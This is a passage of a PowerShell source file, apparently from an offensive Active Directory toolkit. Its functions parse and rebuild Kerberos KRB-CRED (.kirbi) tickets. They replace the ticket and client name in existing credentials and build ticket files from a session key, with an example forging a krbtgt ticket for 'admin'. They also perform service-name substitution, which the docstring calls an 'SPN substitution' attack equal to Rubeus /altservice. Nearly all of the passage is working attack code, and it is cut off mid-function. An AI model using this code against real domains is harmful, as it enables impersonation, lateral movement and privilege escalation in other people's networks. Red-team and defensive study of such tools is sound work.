    $krbCred = Build-KRBCred -Ticket $ticket -SessionKey $key -SessionKeyType 18 `
                              -Realm "CONTOSO.COM" -ClientName "admin" `
                              -ServerName "krbtgt" -ServerInstance "CONTOSO.COM"
    [IO.File]::WriteAllBytes("ticket.kirbi", $krbCred)

.NOTES
    KRB-CRED structure (RFC 4120):
    KRB-CRED ::= [APPLICATION 22] SEQUENCE {
        pvno [0] INTEGER (5),
        msg-type [1] INTEGER (22),
        tickets [2] SEQUENCE OF Ticket,
        enc-part [3] EncryptedData -- EncKrbCredPart
    }

    EncKrbCredPart ::= [APPLICATION 29] SEQUENCE {
        ticket-info [0] SEQUENCE OF KrbCredInfo
    }
#>
function Update-KRBCredTicket {
    <#
    .SYNOPSIS
        Replaces the Ticket and optionally the client name in an existing KRB-CRED.
    .DESCRIPTION
        In-place modification of a KRB-CRED structure (like Rubeus ModifyTicket).
        The Ticket bytes (APPLICATION 1) inside [2] tickets are replaced.
        If NewClientName is provided, the pname in EncKrbCredPart is also updated
        while preserving the session key and all other fields as raw bytes.
        This guarantees the session key in the KRB-CRED matches what was originally issued.
    .PARAMETER OriginalKRBCred
        The original KRB-CRED bytes (.kirbi format).
    .PARAMETER NewTicket
        The new Ticket bytes (APPLICATION 1) to replace the original.
    .PARAMETER NewClientName
        Optional new client name to set in the EncKrbCredPart pname field.
        If not provided, the original pname is preserved byte-for-byte.
    .OUTPUTS
        [byte[]] Modified KRB-CRED with new ticket and optionally updated pname.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$OriginalKRBCred,

        [Parameter(Mandatory=$true)]
        [byte[]]$NewTicket,

        [Parameter(Mandatory=$false)]
        [string]$NewClientName
    )

    # Parse APPLICATION 22 outer tag
    $app22 = Read-ASN1Element -Data $OriginalKRBCred -Offset 0
    if ($app22.Tag -ne 0x76) {
        throw "Invalid KRB-CRED: Expected APPLICATION 22, got 0x$($app22.Tag.ToString('X2'))"
    }

    # Parse inner SEQUENCE
    $seq = Read-ASN1Element -Data $app22.Content -Offset 0
    if ($seq.Tag -ne 0x30) {
        throw "Invalid KRB-CRED: Expected SEQUENCE, got 0x$($seq.Tag.ToString('X2'))"
    }

    # Extract all 4 children as raw byte ranges from the SEQUENCE content
    # Note: Read-ASN1Children uses Write-Output -NoEnumerate, so do NOT wrap in @()
    # which would create a nested array (1 element containing the inner array)
    $children = Read-ASN1Children -Data $seq.Content
    if ($children.Count -lt 4) {
        throw "Invalid KRB-CRED: Expected 4 children, got $($children.Count)"
    }

    # Reconstruct raw bytes for each child from SEQUENCE content
    $seqContent = $seq.Content
    $childRawBytes = @()
    $pos = 0
    for ($i = 0; $i -lt $children.Count; $i++) {
        $totalLen = $children[$i].TotalLength
        $childRawBytes += ,([byte[]]$seqContent[$pos..($pos + $totalLen - 1)])
        $pos += $totalLen
    }

    # child[0] = [0] pvno       -> keep original
    # child[1] = [1] msg-type   -> keep original
    # child[2] = [2] tickets    -> replace with new ticket
    # child[3] = [3] enc-part   -> modify pname if NewClientName provided, preserve rest

    # Build new [2] tickets: context tag 2 wrapping SEQUENCE OF Ticket
    $newTicketsField = [byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1Sequence -Data $NewTicket))

    # Handle enc-part [3]: either modify pname or keep original
    $encPartField = $childRawBytes[3]
    if ($NewClientName) {
        $encPartField = Update-KRBCredEncPartPName -EncPartRawBytes ([byte[]]$childRawBytes[3]) -NewClientName $NewClientName
    }

    # Reassemble KRB-CRED SEQUENCE content
    $newSeqContent = New-Object System.Collections.Generic.List[byte]
    $newSeqContent.AddRange([byte[]]$childRawBytes[0])   # [0] pvno - original
    $newSeqContent.AddRange([byte[]]$childRawBytes[1])   # [1] msg-type - original
    $newSeqContent.AddRange([byte[]]$newTicketsField)     # [2] tickets - NEW
    $newSeqContent.AddRange([byte[]]$encPartField)        # [3] enc-part - modified pname or original

    # Wrap in SEQUENCE and APPLICATION 22
    $newSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newSeqContent.ToArray()))
    $newKrbCred = [byte[]](New-ASN1ApplicationTag -Tag 22 -Data $newSeq)

    Write-Verbose "[Update-KRBCredTicket] Original KRB-CRED: $($OriginalKRBCred.Length) bytes, New KRB-CRED: $($newKrbCred.Length) bytes"
    if ($NewClientName) {
        Write-Verbose "[Update-KRBCredTicket] Updated pname in EncKrbCredPart to: $NewClientName"
    }

    return $newKrbCred
}

function Update-KRBCredEncPartPName {
    <#
    .SYNOPSIS
        Updates the pname field in a KRB-CRED enc-part [3] while preserving all other fields as raw bytes.
    .DESCRIPTION
        Parses the enc-part context tag [3] -> EncryptedData -> cipher -> EncKrbCredPart [APPLICATION 29]
        -> KrbCredInfo SEQUENCE, then replaces only the [2] pname field with the new client name.
        All other fields (especially [0] key = session key) are preserved as raw bytes.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$EncPartRawBytes,

        [Parameter(Mandatory=$true)]
        [string]$NewClientName
    )

    # Parse context tag [3] -> content is EncryptedData SEQUENCE
    $ctxTag3 = Read-ASN1Element -Data $EncPartRawBytes -Offset 0

    # Parse EncryptedData SEQUENCE: { [0] etype, [2] cipher }
    $encDataSeq = Read-ASN1Element -Data $ctxTag3.Content -Offset 0
    $encDataChildren = Read-ASN1Children -Data $encDataSeq.Content

    # Find cipher field [2] containing the EncKrbCredPart
    $cipherContent = $null
    $etypeRawBytes = $null
    $encDataSeqContent = $encDataSeq.Content
    $edPos = 0
    $edChildRaw = @()
    for ($i = 0; $i -lt $encDataChildren.Count; $i++) {
        $edChildRaw += ,([byte[]]$encDataSeqContent[$edPos..($edPos + $encDataChildren[$i].TotalLength - 1)])
        $tagNum = $encDataChildren[$i].Tag -band 0x1F
        if ($tagNum -eq 2) {
            # [2] cipher - OCTET STRING containing EncKrbCredPart
            $cipherOctet = Read-ASN1Element -Data $encDataChildren[$i].Content -Offset 0
            $cipherContent = $cipherOctet.Content
        }
        $edPos += $encDataChildren[$i].TotalLength
    }

    if (-not $cipherContent) {
        throw "Update-KRBCredEncPartPName: cipher field [2] not found in EncryptedData"
    }

    # Parse EncKrbCredPart [APPLICATION 29] -> SEQUENCE -> [0] ticket-info -> SEQUENCE OF KrbCredInfo
    $app29 = Read-ASN1Element -Data $cipherContent -Offset 0
    $app29Seq = Read-ASN1Element -Data $app29.Content -Offset 0
    $app29Children = Read-ASN1Children -Data $app29Seq.Content

    # Find [0] ticket-info
    $ticketInfoChild = $null
    foreach ($child in $app29Children) {
        if (($child.Tag -band 0x1F) -eq 0) {
            $ticketInfoChild = $child
            break
        }
    }

    if (-not $ticketInfoChild) {
        throw "Update-KRBCredEncPartPName: ticket-info [0] not found in EncKrbCredPart"
    }

    # Parse SEQUENCE OF KrbCredInfo -> get first KrbCredInfo SEQUENCE
    $ticketInfoSeq = Read-ASN1Element -Data $ticketInfoChild.Content -Offset 0
    $credInfoElements = Read-ASN1Children -Data $ticketInfoSeq.Content

    # First element is our KrbCredInfo SEQUENCE
    $credInfoSeq = $credInfoElements[0]
    $credInfoChildren = Read-ASN1Children -Data $credInfoSeq.Content

    # Walk through KrbCredInfo fields, extract raw bytes, replace [2] pname
    $credInfoSeqContent = $credInfoSeq.Content
    $ciPos = 0
    $newCredInfoContent = New-Object System.Collections.Generic.List[byte]

    for ($i = 0; $i -lt $credInfoChildren.Count; $i++) {
        $fieldLen = $credInfoChildren[$i].TotalLength
        $fieldRaw = [byte[]]$credInfoSeqContent[$ciPos..($ciPos + $fieldLen - 1)]
        $tagNum = $credInfoChildren[$i].Tag -band 0x1F

        if ($tagNum -eq 2) {
            # [2] pname - replace with new client name
            $cnameContent = New-Object System.Collections.Generic.List[byte]
            $cnameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 1)))  # NT-PRINCIPAL
            $cnameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data (New-ASN1GeneralString -Value $NewClientName))))
            $newPname = [byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1Sequence -Data ([byte[]]$cnameContent.ToArray())))
            $newCredInfoContent.AddRange($newPname)
            Write-Verbose "[Update-KRBCredEncPartPName] Replaced pname [2]: $($fieldRaw.Length) bytes -> $($newPname.Length) bytes"
        } else {
            # All other fields: preserve raw bytes (session key, realm, flags, times, sname)
            $newCredInfoContent.AddRange($fieldRaw)
        }

        $ciPos += $fieldLen
    }

    # Rebuild: KrbCredInfo SEQUENCE -> SEQUENCE OF -> [0] ticket-info -> EncKrbCredPart SEQUENCE -> APPLICATION 29
    $newCredInfoSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newCredInfoContent.ToArray()))
    $newTicketInfoSeq = [byte[]](New-ASN1Sequence -Data $newCredInfoSeq)
    $newTicketInfoField = [byte[]](New-ASN1ContextTag -Tag 0 -Data $newTicketInfoSeq)
    $newApp29Seq = [byte[]](New-ASN1Sequence -Data $newTicketInfoField)
    $newApp29 = [byte[]](New-ASN1ApplicationTag -Tag 29 -Data $newApp29Seq)

    # Rebuild EncryptedData: { [0] etype (original), [2] cipher (new EncKrbCredPart) }
    $newEncDataContent = New-Object System.Collections.Generic.List[byte]
    $edRebuildPos = 0
    for ($i = 0; $i -lt $encDataChildren.Count; $i++) {
        $edFieldLen = $encDataChildren[$i].TotalLength
        $tagNum = $encDataChildren[$i].Tag -band 0x1F
        if ($tagNum -eq 2) {
            # [2] cipher - wrap new EncKrbCredPart in OCTET STRING
            $newEncDataContent.AddRange([byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1OctetString -Value $newApp29)))
        } else {
            # Preserve other fields (etype, kvno) as raw bytes
            $rawField = [byte[]]$encDataSeqContent[$edRebuildPos..($edRebuildPos + $edFieldLen - 1)]
            $newEncDataContent.AddRange($rawField)
        }
        $edRebuildPos += $edFieldLen
    }
    $newEncDataSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newEncDataContent.ToArray()))

    # Wrap in context tag [3]
    return [byte[]](New-ASN1ContextTag -Tag 3 -Data $newEncDataSeq)
}

function Update-KRBCredSName {
    <#
    .SYNOPSIS
        Substitutes the service name (sname) in a KRB-CRED structure (Alternative Service / altservice).
    .DESCRIPTION
        Modifies the sname in both the outer Ticket (APPLICATION 1, field [2]) and the
        EncKrbCredPart KrbCredInfo (field [9]) while preserving all other fields as raw bytes.

        This enables "SPN substitution" attacks: the encrypted ticket payload (EncTicketPart)
        does NOT contain sname, so modifying the cleartext sname routing label does not
        invalidate the ticket. The target service decrypts with its own key regardless of
        what sname says, as long as the same account key was used.

        Equivalent to Rubeus /altservice and Impacket tgssub.
    .PARAMETER KRBCredBytes
        The complete KRB-CRED bytes (.kirbi format).
    .PARAMETER NewServiceType
        The new service type to substitute (e.g., "cifs", "ldap", "http", "host").
    .PARAMETER NewHostName
        Optional new hostname. If not provided, the original hostname is preserved.
    .OUTPUTS
        [byte[]] Modified KRB-CRED with substituted sname in both Ticket and EncKrbCredPart.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$KRBCredBytes,

        [Parameter(Mandatory=$true)]
        [string]$NewServiceType,

        [Parameter(Mandatory=$false)]
        [string]$NewHostName
    )

    # =====================================================
    # Helper: Build a new PrincipalName (NT-SRV-INST=2)
    # =====================================================
    function Build-SNameBytes {
        param([string]$ServiceType, [string]$HostName)
        $snameContent = New-Object System.Collections.Generic.List[byte]
        # name-type [0] INTEGER = 2 (NT-SRV-INST)
        $snameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 2)))
        # name-string [1] SEQUENCE OF GeneralString
        $nameSeq = New-Object System.Collections.Generic.List[byte]
        $nameSeq.AddRange([byte[]](New-ASN1GeneralString -Value $ServiceType))
        $nameSeq.AddRange([byte[]](New-ASN1GeneralString -Value $HostName))
        $snameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data ([byte[]]$nameSeq.ToArray()))))
        return [byte[]](New-ASN1Sequence -Data ([byte[]]$snameContent.ToArray()))
    }

    # =====================================================
    # Helper: Extract hostname from an existing sname field
    # =====================================================
    function Extract-HostNameFromSName {
        param([byte[]]$SNameBytes)
        # Parse PrincipalName SEQUENCE -> find [1] name-string -> SEQUENCE OF GeneralString -> second element
        $snameSeq = Read-ASN1Element -Data $SNameBytes -Offset 0
        $snameChildren = Read-ASN1Children -Data $snameSeq.Content
        foreach ($child in $snameChildren) {
            $tagNum = $child.Tag -band 0x1F
            if ($tagNum -eq 1) {
                # [1] name-string: SEQUENCE OF GeneralString
                $nameStringSeq = Read-ASN1Element -Data $child.Content -Offset 0
                $nameElements = Read-ASN1Children -Data $nameStringSeq.Content
                $nameSeqContent = $nameStringSeq.Content
                $pos = 0
                $components = @()
                for ($i = 0; $i -lt $nameElements.Count; $i++) {
                    $elemLen = $nameElements[$i].TotalLength
                    $elemRaw = [byte[]]$nameSeqContent[$pos..($pos + $elemLen - 1)]
                    $elemParsed = Read-ASN1Element -Data $elemRaw -Offset 0
                    $components += [System.Text.Encoding]::ASCII.GetString($elemParsed.Content)
                    $pos += $elemLen
                }
                # Return hostname (second component for service/host SPNs)
                if ($components.Count -ge 2) {
                    return $components[1]
                } elseif ($components.Count -eq 1) {
                    return $components[0]
                }
            }
        }
        return $null
    }

    # =====================================================
    # Part 1: Parse KRB-CRED outer structure
    # =====================================================
    $app22 = Read-ASN1Element -Data $KRBCredBytes -Offset 0
    if ($app22.Tag -ne 0x76) {
        throw "Update-KRBCredSName: Expected APPLICATION 22 (KRB-CRED), got 0x$($app22.Tag.ToString('X2'))"
    }

    $seq = Read-ASN1Element -Data $app22.Content -Offset 0
    if ($seq.Tag -ne 0x30) {
        throw "Update-KRBCredSName: Expected SEQUENCE, got 0x$($seq.Tag.ToString('X2'))"
    }

    $children = Read-ASN1Children -Data $seq.Content
    if ($children.Count -lt 4) {
        throw "Update-KRBCredSName: Expected 4 children in KRB-CRED, got $($children.Count)"
    }

    # Extract raw bytes for each child
    $seqContent = $seq.Content
    $childRawBytes = @()
    $pos = 0
    for ($i = 0; $i -lt $children.Count; $i++) {
        $totalLen = $children[$i].TotalLength
        $childRawBytes += ,([byte[]]$seqContent[$pos..($pos + $totalLen - 1)])
        $pos += $totalLen
    }

    # =====================================================
    # Part 2: Modify Ticket sname [2] (outer Ticket structure)
    # =====================================================
    # child[2] = [2] tickets (context tag wrapping SEQUENCE OF Ticket)
    $ticketsCtx = Read-ASN1Element -Data ([byte[]]$childRawBytes[2]) -Offset 0
    # Parse SEQUENCE OF Ticket
    $ticketsSeq = Read-ASN1Element -Data $ticketsCtx.Content -Offset 0

    # First Ticket: APPLICATION 1
    $app1 = Read-ASN1Element -Data $ticketsSeq.Content -Offset 0
    $ticketSeq = Read-ASN1Element -Data $app1.Content -Offset 0
    $ticketChildren = Read-ASN1Children -Data $ticketSeq.Content

    # Extract raw bytes for ticket children
    $ticketSeqContent = $ticketSeq.Content
    $ticketChildRaw = @()
    $tPos = 0
    for ($i = 0; $i -lt $ticketChildren.Count; $i++) {
        $tLen = $ticketChildren[$i].TotalLength
        $ticketChildRaw += ,([byte[]]$ticketSeqContent[$tPos..($tPos + $tLen - 1)])
        $tPos += $tLen
    }

    # Determine hostname (from existing sname if not provided)
    $hostName = $NewHostName
    if (-not $hostName) {
        # Find [2] sname in ticket children and extract hostname
        for ($i = 0; $i -lt $ticketChildren.Count; $i++) {
            $tagNum = $ticketChildren[$i].Tag -band 0x1F
            if ($tagNum -eq 2) {
                # [2] sname - extract hostname from existing PrincipalName
                $hostName = Extract-HostNameFromSName -SNameBytes $ticketChildren[$i].Content
                break
            }
        }
    }

    if (-not $hostName) {
        throw "Update-KRBCredSName: Could not determine hostname from existing ticket sname"
    }

    Write-Verbose "[Update-KRBCredSName] Substituting sname to $NewServiceType/$hostName"

    # Build new sname PrincipalName
    $newSNameBytes = Build-SNameBytes -ServiceType $NewServiceType -HostName $hostName

    # Reassemble Ticket SEQUENCE with substituted sname [2]
    $newTicketContent = New-Object System.Collections.Generic.List[byte]
    for ($i = 0; $i -lt $ticketChildren.Count; $i++) {
        $tagNum = $ticketChildren[$i].Tag -band 0x1F
        if ($tagNum -eq 2) {
            # Replace [2] sname
            $newSnameField = [byte[]](New-ASN1ContextTag -Tag 2 -Data $newSNameBytes)
            $newTicketContent.AddRange($newSnameField)
        } else {
            # Preserve all other fields as raw bytes ([0] tkt-vno, [1] realm, [3] enc-part)
            $newTicketContent.AddRange([byte[]]$ticketChildRaw[$i])
        }
    }

    # Rebuild: Ticket SEQUENCE -> APPLICATION 1 -> SEQUENCE OF -> [2] tickets
    $newTicketSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newTicketContent.ToArray()))
    $newApp1 = [byte[]](New-ASN1ApplicationTag -Tag 1 -Data $newTicketSeq)
    $newTicketsField = [byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1Sequence -Data $newApp1))

    # =====================================================
    # Part 3: Modify EncKrbCredPart sname [9] (KrbCredInfo)
    # =====================================================
    # Reuse the Update-KRBCredEncPartPName pattern but for tag [9]
    $encPartRawBytes = [byte[]]$childRawBytes[3]

    # Parse context tag [3] -> EncryptedData SEQUENCE
    $ctxTag3 = Read-ASN1Element -Data $encPartRawBytes -Offset 0
    $encDataSeq = Read-ASN1Element -Data $ctxTag3.Content -Offset 0
    $encDataChildren = Read-ASN1Children -Data $encDataSeq.Content

    # Extract raw bytes and find cipher [2]
    $encDataSeqContent = $encDataSeq.Content
    $edPos = 0
    $edChildRaw = @()
    $cipherContent = $null
    for ($i = 0; $i -lt $encDataChildren.Count; $i++) {
        $edChildRaw += ,([byte[]]$encDataSeqContent[$edPos..($edPos + $encDataChildren[$i].TotalLength - 1)])
        $tagNum = $encDataChildren[$i].Tag -band 0x1F
        if ($tagNum -eq 2) {
            $cipherOctet = Read-ASN1Element -Data $encDataChildren[$i].Content -Offset 0
            $cipherContent = $cipherOctet.Content
        }
        $edPos += $encDataChildren[$i].TotalLength
    }

    if (-not $cipherContent) {
        throw "Update-KRBCredSName: cipher field [2] not found in EncryptedData"
    }

    # Parse EncKrbCredPart [APPLICATION 29] -> SEQUENCE -> [0] ticket-info -> SEQUENCE OF KrbCredInfo
    $app29 = Read-ASN1Element -Data $cipherContent -Offset 0
    $app29Seq = Read-ASN1Element -Data $app29.Content -Offset 0
    $app29Children = Read-ASN1Children -Data $app29Seq.Content

    # Find [0] ticket-info
    $ticketInfoChild = $null
    foreach ($child in $app29Children) {
        if (($child.Tag -band 0x1F) -eq 0) {
            $ticketInfoChild = $child
            break
        }
    }

    if (-not $ticketInfoChild) {
        throw "Update-KRBCredSName: ticket-info [0] not found in EncKrbCredPart"
    }

    # Parse SEQUENCE OF KrbCredInfo -> first KrbCredInfo
    $ticketInfoSeq = Read-ASN1Element -Data $ticketInfoChild.Content -Offset 0
    $credInfoElements = Read-ASN1Children -Data $ticketInfoSeq.Content
    $credInfoSeq = $credInfoElements[0]
    $credInfoChildren = Read-ASN1Children -Data $credInfoSeq.Content

    # Walk KrbCredInfo fields, replace [9] sname
    $credInfoSeqContent = $credInfoSeq.Content
    $ciPos = 0
    $newCredInfoContent = New-Object System.Collections.Generic.List[byte]

    for ($i = 0; $i -lt $credInfoChildren.Count; $i++) {
        $fieldLen = $credInfoChildren[$i].TotalLength
        $fieldRaw = [byte[]]$credInfoSeqContent[$ciPos..($ciPos + $fieldLen - 1)]
        $tagNum = $credInfoChildren[$i].Tag -band 0x1F

        if ($tagNum -eq 9) {
            # [9] sname - replace with new service name
            $newSnameField9 = [byte[]](New-ASN1ContextTag -Tag 9 -Data $newSNameBytes)
            $newCredInfoContent.AddRange($newSnameField9)
            Write-Verbose "[Update-KRBCredSName] Replaced sname [9] in KrbCredInfo: $($fieldRaw.Length) bytes -> $($newSnameField9.Length) bytes"
        } else {
            # Preserve all other fields as raw bytes
            $newCredInfoContent.AddRange($fieldRaw)
        }

        $ciPos += $fieldLen
    }

    # Rebuild: KrbCredInfo SEQUENCE -> SEQUENCE OF -> [0] ticket-info -> EncKrbCredPart SEQUENCE -> APPLICATION 29
    $newCredInfoSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newCredInfoContent.ToArray()))
    $newTicketInfoSeq = [byte[]](New-ASN1Sequence -Data $newCredInfoSeq)
    $newTicketInfoField = [byte[]](New-ASN1ContextTag -Tag 0 -Data $newTicketInfoSeq)
    $newApp29Seq = [byte[]](New-ASN1Sequence -Data $newTicketInfoField)
    $newApp29 = [byte[]](New-ASN1ApplicationTag -Tag 29 -Data $newApp29Seq)

    # Rebuild EncryptedData
    $newEncDataContent = New-Object System.Collections.Generic.List[byte]
    $edRebuildPos = 0
    for ($i = 0; $i -lt $encDataChildren.Count; $i++) {
        $edFieldLen = $encDataChildren[$i].TotalLength
        $tagNum = $encDataChildren[$i].Tag -band 0x1F
        if ($tagNum -eq 2) {
            # [2] cipher - wrap new EncKrbCredPart in OCTET STRING
            $newEncDataContent.AddRange([byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1OctetString -Value $newApp29)))
        } else {
            # Preserve other fields (etype, kvno) as raw bytes
            $rawField = [byte[]]$encDataSeqContent[$edRebuildPos..($edRebuildPos + $edFieldLen - 1)]
            $newEncDataContent.AddRange($rawField)
        }
        $edRebuildPos += $edFieldLen
    }
    $newEncDataSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newEncDataContent.ToArray()))
    $newEncPartField = [byte[]](New-ASN1ContextTag -Tag 3 -Data $newEncDataSeq)

    # =====================================================
    # Part 4: Reassemble KRB-CRED
    # =====================================================
    $newSeqContent = New-Object System.Collections.Generic.List[byte]
    $newSeqContent.AddRange([byte[]]$childRawBytes[0])   # [0] pvno - original
    $newSeqContent.AddRange([byte[]]$childRawBytes[1])   # [1] msg-type - original
    $newSeqContent.AddRange([byte[]]$newTicketsField)     # [2] tickets - modified sname
    $newSeqContent.AddRange([byte[]]$newEncPartField)     # [3] enc-part - modified sname [9]

    $newSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newSeqContent.ToArray()))
    $newKrbCred = [byte[]](New-ASN1ApplicationTag -Tag 22 -Data $newSeq)

    Write-Verbose "[Update-KRBCredSName] SPN substituted: $NewServiceType/$hostName (original: $($KRBCredBytes.Length) bytes, new: $($newKrbCred.Length) bytes)"

    return $newKrbCred
}

function Build-KRBCred {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Ticket,

        [Parameter(Mandatory=$true)]
        [byte[]]$SessionKey,

        [Parameter(Mandatory=$true)]
        [int]$SessionKeyType,

        [Parameter(Mandatory=$true)]
        [string]$Realm,

        [Parameter(Mandatory=$true)]
        [string]$ClientName,

        [Parameter(Mandatory=$false)]
        [string]$ServerName = "krbtgt",

        [Parameter(Mandatory=$false)]
        [string]$ServerInstance,

        [Parameter(Mandatory=$false)]
        [datetime]$AuthTime,

        [Parameter(Mandatory=$false)]
        [datetime]$StartTime,

        [Parameter(Mandatory=$false)]
        [datetime]$EndTime,

        [Parameter(Mandatory=$false)]
        [datetime]$RenewTill,

        [Parameter(Mandatory=$false)]
        [byte[]]$TicketFlags
    )

    # Default times if not provided
    $now = [datetime]::UtcNow
    if (-not $AuthTime) { $AuthTime = $now }
    if (-not $StartTime) { $StartTime = $now }
    if (-not $EndTime) { $EndTime = $now.AddHours(10) }
    if (-not $RenewTill) { $RenewTill = $now.AddDays(7) }

    # Default flags if not provided: forwardable (bit 1) + renewable (bit 8) + initial (bit 9) + pre-authent (bit 10)
    # 0x50800000 = these standard TGT flags
    if (-not $TicketFlags -or $TicketFlags.Length -ne 4) {
        $TicketFlags = [byte[]]@(0x50, 0x80, 0x00, 0x00)
    }

    $realmUpper = $Realm.ToUpper()

    # EncryptionKey
    # EncryptionKey ::= SEQUENCE { keytype [0] INT32, keyvalue [1] OCTET STRING }
    $keyContent = New-Object System.Collections.Generic.List[byte]
    $keyContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $SessionKeyType)))
    $keyContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1OctetString -Value $SessionKey)))
    $encKey = New-ASN1Sequence -Data ([byte[]]$keyContent.ToArray())

    # KrbCredInfo ::= SEQUENCE {
    #   key [0] EncryptionKey,
    #   prealm [1] Realm OPTIONAL,
    #   pname [2] PrincipalName OPTIONAL,
    #   flags [3] TicketFlags OPTIONAL,
    #   authtime [4] KerberosTime OPTIONAL,
    #   starttime [5] KerberosTime OPTIONAL,
    #   endtime [6] KerberosTime OPTIONAL,
    #   renew-till [7] KerberosTime OPTIONAL,
    #   srealm [8] Realm OPTIONAL,
    #   sname [9] PrincipalName OPTIONAL
    # }
    $credInfoContent = New-Object System.Collections.Generic.List[byte]

    # [0] key
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data $encKey))

    # [1] prealm (client realm)
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1GeneralString -Value $realmUpper)))

    # [2] pname (client principal)
    $cnameContent = New-Object System.Collections.Generic.List[byte]
    $cnameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 1)))  # NT-PRINCIPAL
    $cnameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data (New-ASN1GeneralString -Value $ClientName))))
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1Sequence -Data ([byte[]]$cnameContent.ToArray()))))

    # [3] flags - use provided flags from EncKDCRepPart (critical for LSA acceptance)
    # $TicketFlags already validated/defaulted at parameter binding
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 3 -Data (New-ASN1BitString -Value $TicketFlags)))

    # [4] authtime - required by Windows LSA for ticket acceptance
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 4 -Data (New-ASN1GeneralizedTime -Value $AuthTime)))

    # [5] starttime
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 5 -Data (New-ASN1GeneralizedTime -Value $StartTime)))

    # [6] endtime
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 6 -Data (New-ASN1GeneralizedTime -Value $EndTime)))

    # [7] renew-till
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 7 -Data (New-ASN1GeneralizedTime -Value $RenewTill)))

    # [8] srealm (server realm)
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 8 -Data (New-ASN1GeneralString -Value $realmUpper)))

    # [9] sname (server principal) - krbtgt/REALM for TGT
    $snameContent = New-Object System.Collections.Generic.List[byte]
    if ($ServerInstance) {
        # NT-SRV-INST (2) - krbtgt/REALM
        $snameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 2)))
        # Build name sequence with List to avoid Object[] from concatenation
        $nameSeq = New-Object System.Collections.Generic.List[byte]
        $nameSeq.AddRange([byte[]](New-ASN1GeneralString -Value $ServerName))
        $nameSeq.AddRange([byte[]](New-ASN1GeneralString -Value $ServerInstance))
        $snameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data ([byte[]]$nameSeq.ToArray()))))
    } else {
        # NT-PRINCIPAL (1) - just service name
        $snameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 1)))
        $snameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data (New-ASN1GeneralString -Value $ServerName))))
    }
    $credInfoContent.AddRange([byte[]](New-ASN1ContextTag -Tag 9 -Data (New-ASN1Sequence -Data ([byte[]]$snameContent.ToArray()))))

    $krbCredInfo = New-ASN1Sequence -Data ([byte[]]$credInfoContent.ToArray())

    # EncKrbCredPart ::= [APPLICATION 29] SEQUENCE { ticket-info [0] SEQUENCE OF KrbCredInfo }
    $encKrbCredPartContent = [byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Sequence -Data $krbCredInfo))
    $encKrbCredPartSeq = [byte[]](New-ASN1Sequence -Data $encKrbCredPartContent)
    $encKrbCredPart = [byte[]](New-ASN1ApplicationTag -Tag 29 -Data $encKrbCredPartSeq)

    # EncryptedData for enc-part (unencrypted, etype 0 - standard for local kirbi files)
    # EncryptedData ::= SEQUENCE { etype [0] INT32, kvno [1] UInt32 OPTIONAL, cipher [2] OCTET STRING }
    $encDataContent = New-Object System.Collections.Generic.List[byte]
    $encDataContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 0)))  # etype 0 = no encryption
    $encDataContent.AddRange([byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1OctetString -Value $encKrbCredPart)))  # cipher
    $encData = [byte[]](New-ASN1Sequence -Data ([byte[]]$encDataContent.ToArray()))

    # KRB-CRED ::= [APPLICATION 22] SEQUENCE {
    #   pvno [0] INTEGER (5),
    #   msg-type [1] INTEGER (22),
    #   tickets [2] SEQUENCE OF Ticket,
    #   enc-part [3] EncryptedData
    # }
    $krbCredContent = New-Object System.Collections.Generic.List[byte]
    $krbCredContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 5)))   # pvno
    $krbCredContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value 22)))  # msg-type (KRB-CRED)
    $krbCredContent.AddRange([byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1Sequence -Data $Ticket)))  # tickets
